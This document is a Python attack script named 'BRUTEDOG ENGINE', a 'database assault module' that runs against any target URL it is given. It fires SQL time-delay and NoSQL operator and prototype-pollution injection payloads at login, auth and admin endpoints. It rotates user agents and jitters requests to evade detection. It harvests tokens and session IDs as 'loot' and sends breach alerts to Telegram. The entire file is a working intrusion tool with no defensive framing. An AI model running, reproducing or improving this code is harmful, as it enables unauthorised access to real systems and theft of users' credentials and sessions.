#!/usr/bin/env python3
"""
BRUTEDOG ENGINE v8.8 — Polymorphic Adaptive Database Assault Module
"""
import asyncio
import hashlib
import http.client
import json
import random
import re
import ssl
import sys
import time
from urllib.parse import urlsplit

from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
from modules.loot_logger import save_session_loot
from modules.telegram_notifier import send_telegram_alert
from modules.telemetry import stream_proof

REQUEST_TIMEOUT = 8
MAX_RESPONSE_SIZE = 128 * 1024

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "GRAY": "\033[90m",
    "PURPLE": "\033[95m",
    "RESET": "\033[0m",
}

HIGH_VALUE_KEYWORDS = [
    "critical",
    "bypass",
    "loot",
    "token",
    "session",
    "admin",
    "credential",
    "compromised",
    "race",
    "pivot",
    "jwt",
    "dump",
    "sqli",
    "injection",
]

SQL_TIME_PAYLOADS = [
    "' OR SLEEP(5)-- -",
    "'; WAITFOR DELAY '0:0:5'-- -",
    "' AND (SELECT 9463 FROM(SELECT(SLEEP(5)))v)---",
    "1' AND BENCHMARK(50000000,MD5(1))-- -",
]

NOSQL_POLYMORPHIC_VECTORS = [
    {
        "name": "NoSQL Regex/Not-Equal Operator",
        "string_variant": {"username": "admin' || '1'=='1", "password": "password"},
        "object_variant": {"username": {"$regex": "^admin.*$"}, "password": {"$ne": ""}},
        "array_variant": {"username[]": "admin", "password[]": "password"},
    },
    {
        "name": "NoSQL JavaScript Where Injection",
        "string_variant": {"username": "admin'; sleep(5);--", "password": "password"},
        "object_variant": {"$where": "sleep(5)"},
        "array_variant": {"$where[]": "true"},
    },
    {
        "name": "Type-Juggling / Boolean Bypass",
        "string_variant": {"username": "admin' OR '1'='1", "password": "password"},
        "object_variant": {"username": {"$gt": ""}, "password": {"$ne": None}},
        "array_variant": {"username[ne]": "none"},
    },
    {
        "name": "Prototype Pollution & Deep Operator Injection",
        "string_variant": {"constructor": {"prototype": {"isAdmin": True}}, "username": "admin"},
        "object_variant": {"__proto__": {"isAdmin": True, "role": "admin"}, "username": {"$exists": True}},
        "array_variant": {"$in": ["admin", "root"], "password": {"$ne": None}},
    },
]

DB_ERROR_PATTERNS = re.compile(
    r"sql syntax|mysql_|pg_query|sqlite3\.|ora-009|mongodb|mongosh|mongoerror|bsonerror|casttoobjectid|syntax error|must be a string",
    re.I,
)

CHALLENGE_OR_HTML_MARKERS = (
    "<!doctype html>",
    "<html",
    '<div id="root"></div>',
    '<div id="__next"></div>',
    "<title>security check</title>",
    "cf-browser-verification",
    "attention required!",
    "just a moment...",
)

_background_tasks: set[asyncio.Task] = set()


def log(msg, color="GREEN"):
    ansi_color = COLORS.get(color, color)
    sys.stdout.write(f"{ansi_color}{msg}{COLORS['RESET']}\n")
    sys.stdout.flush()


async def dispatch_tg_alert_async(loot_type, details):
    try:
        check_str = f"{loot_type} {str(details)}".lower()
        if any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
            await asyncio.wait_for(
                send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details),
                timeout=8,
            )
    except Exception:
        pass


def dispatch_tg_alert_sync(loot_type, details):
    """Non-blockingly fires Telegram alerts from sync or async contexts."""
    try:
        check_str = f"{loot_type} {str(details)}".lower()
        if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
            return

        loop = asyncio.get_running_loop()
        if not loop.is_closed():
            task = loop.create_task(dispatch_tg_alert_async(loot_type, details))
            _background_tasks.add(task)
            task.add_done_callback(_background_tasks.discard)
    except RuntimeError:
        try:
            asyncio.run(dispatch_tg_alert_async(loot_type, details))
        except Exception:
            pass


def get_rotated_headers(ct="application/json"):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    ]
    headers = {
        "User-Agent": random.choice(user_agents),
        "Content-Type": ct,
        "Accept": "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "close",
    }
    headers.update(get_randomized_hints())
    return headers


def send_http(host, port, path, payload, secure, method="POST"):
    apply_behavioral_jitter()
    conn = None
    start = time.monotonic()
    try:
        if secure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=REQUEST_TIMEOUT, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=REQUEST_TIMEOUT)

        if isinstance(payload, dict):
            body = json.dumps(payload).encode("utf-8")
            ct = "application/json"
        else:
            body = str(payload).encode("utf-8")
            ct = "application/x-www-form-urlencoded"

        headers = get_rotated_headers(ct)
        conn.request(method, path, body=body, headers=headers)
        res = conn.getresponse()
        data = res.read(MAX_RESPONSE_SIZE).decode("utf-8", errors="replace")
        elapsed = round(time.monotonic() - start, 3)
        return {"status": res.status, "body": data, "elapsed": elapsed, "error": None}
    except Exception as exc:
        elapsed = round(time.monotonic() - start, 3)
        return {"status": 0, "body": "", "elapsed": elapsed, "error": str(exc)}
    finally:
        if conn:
            try:
                conn.close()
            except Exception:
                pass


async def calibrate_baseline(host, port, endpoint, secure):
    latencies = []
    for _ in range(2):
        res = await asyncio.to_thread(
            send_http, host, port, endpoint, {"username": "baseline_probe", "password": "test"}, secure
        )
        if not res["error"] and res["elapsed"] > 0:
            latencies.append(res["elapsed"])
        await asyncio.sleep(0.15)
    if latencies:
        return (sum(latencies) / len(latencies)) + 4.0
    return 4.5


async def run_nosql_assault(target_host, port=None, use_ssl=None):
    log("\n[***] INITIALIZING POLYMORPHIC ADAPTIVE DATABASE ASSAULT (V8.8 HARDENED & WAF BYPASS) [***]", "PURPLE")
    parsed = urlsplit(target_host if "://" in target_host else f"https://{target_host}")
    host = parsed.hostname
    if not host:
        return []

    secure = parsed.scheme == "https" if use_ssl is None else bool(use_ssl)
    target_port = port or parsed.port or (443 if secure else 80)
    base_path = (parsed.path or "").rstrip("/")

    findings = []
    relative_endpoints = [
        "/api/login",
        "/login",
        "/user/register",
        "/api/search",
        "/api/v1/users",
        "/auth",
        "/api/auth",
        "/admin",
    ]
    test_endpoints = [base_path + ep for ep in relative_endpoints]
    if base_path and base_path not in test_endpoints:
        test_endpoints.append(base_path)

    for endpoint in test_endpoints:
        time_threshold = await calibrate_baseline(host, target_port, endpoint, secure)

        for payload in SQL_TIME_PAYLOADS:
            res1 = await asyncio.to_thread(
                send_http, host, target_port, endpoint, {"username": payload, "password": "password"}, secure
            )
            if res1["elapsed"] >= time_threshold:
                res2 = await asyncio.to_thread(
                    send_http, host, target_port, endpoint, {"username": payload, "password": "password"}, secure
                )
                if res2["elapsed"] >= time_threshold:
                    log(
                        f"[!] CONFIRMED ADAPTIVE TIME-BASED BLIND SQLi [{endpoint}] (Delays: {res1['elapsed']}s, {res2['elapsed']}s)",
                        "RED",
                    )
                    loot_hash = hashlib.sha256(res2["body"].encode("utf-8", errors="ignore")).hexdigest()
                    finding = {
                        "vector": "Time-Based Blind SQLi",
                        "endpoint": endpoint,
                        "payload": payload,
                        "integrity_hash": loot_hash,
                        "delays": [res1["elapsed"], res2["elapsed"]],
                    }
                    findings.append(finding)

                    dispatch_tg_alert_sync("Time-Based Blind SQLi Confirmed", finding)
                    stream_proof(
                        "DB_TIME_BASED_SQLI_CONFIRMED",
                        endpoint,
                        {"payload": payload},
                        f"Verified Delays: {res1['elapsed']}s, {res2['elapsed']}s",
                        finding,
                    )
                    save_session_loot(
                        target=target_host,
                        endpoint=endpoint,
                        finding_type="DB_TIME_BASED_SQLI_CONFIRMED",
                        status=res2["status"],
                        headers={},
                        body=res2["body"],
                        extra_loot=finding,
                    )

        for vector in NOSQL_POLYMORPHIC_VECTORS:
            for variant_type in ("string_variant", "object_variant", "array_variant"):
                payload = vector[variant_type]
                res = await asyncio.to_thread(send_http, host, target_port, endpoint, payload, secure)
                body_str = res["body"] or ""
                body_lower = body_str.lower()

                is_spa_or_html = (
                    any(m in body_lower for m in CHALLENGE_OR_HTML_MARKERS)
                    or len(body_str.strip()) < 30
                )

                error_match = DB_ERROR_PATTERNS.search(body_str)
                if not is_spa_or_html and error_match and "must be a string" not in error_match.group(0).lower():
                    loot_hash = hashlib.sha256(body_str.encode("utf-8", errors="ignore")).hexdigest()
                    finding = {
                        "vector": f"Error-Based Inference [{variant_type}]",
                        "endpoint": endpoint,
                        "error": error_match.group(0),
                        "integrity_hash": loot_hash,
                    }
                    findings.append(finding)

                    dispatch_tg_alert_sync(f"Database Injection Error Leak ({vector['name']})", finding)
                    stream_proof("DB_ERROR_LEAK", endpoint, {"vector": vector["name"]}, error_match.group(0), finding)
                    save_session_loot(
                        target=target_host,
                        endpoint=endpoint,
                        finding_type="DB_ERROR_BASED_INFERENCE",
                        status=res["status"],
                        headers={},
                        body=body_str,
                        extra_loot=finding,
                    )

                has_auth_indicators = any(
                    token in body_lower
                    for token in (
                        '"access_token"',
                        '"auth_token"',
                        '"session_id"',
                        '"authenticated":true',
                        '"role":"admin"',
                        '"user_id":',
                    )
                )

                if res["status"] in (200, 201, 302) and not is_spa_or_html and has_auth_indicators:
                    log(
                        f"[+] VERIFIED DATABASE BYPASS / EXFILTRATION [{endpoint}] ({vector['name']} - {variant_type})",
                        "GREEN",
                    )
                    loot_hash = hashlib.sha256(body_str.encode("utf-8", errors="ignore")).hexdigest()
                    finding = {
                        "vector": f"Polymorphic Injection [{variant_type}]",
                        "endpoint": endpoint,
                        "payload": str(payload),
                        "integrity_hash": loot_hash,
                        "response_sample": body_str[:300],
                    }
                    findings.append(finding)

                    dispatch_tg_alert_sync(f"Database Polymorphic Bypass Verified ({vector['name']})", finding)
                    stream_proof("DB_BYPASS_VERIFIED", endpoint, {"vector": vector["name"]}, body_str[:300], finding)
                    save_session_loot(
                        target=target_host,
                        endpoint=endpoint,
                        finding_type="DB_POLYMORPHIC_BYPASS_VERIFIED",
                        status=res["status"],
                        headers={},
                        body=body_str,
                        extra_loot=finding,
                    )

    log(f"[+] Database assault complete. Total verified vectors: {len(findings)}", "GREEN")
    return findings


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 db_assault.py <target_url>")
        sys.exit(1)
    asyncio.run(run_nosql_assault(sys.argv[1]))
